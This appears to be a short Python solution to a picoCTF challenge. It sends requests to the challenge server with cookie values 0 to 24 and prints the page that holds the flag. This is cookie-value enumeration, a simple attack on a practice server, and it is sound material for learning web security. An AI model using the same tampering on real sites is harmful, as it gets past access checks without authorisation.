import requests

for i in range(25):
    cookie = f"name={i}"
    headers = {"Cookie": cookie}

    r = requests.get("http://mercury.picoctf.net:29649/check", headers=headers)

    if r.status_code == 200:
        print(f"{cookie}")

        if "picoCTF" in r.text:
            print(r.text)
            break
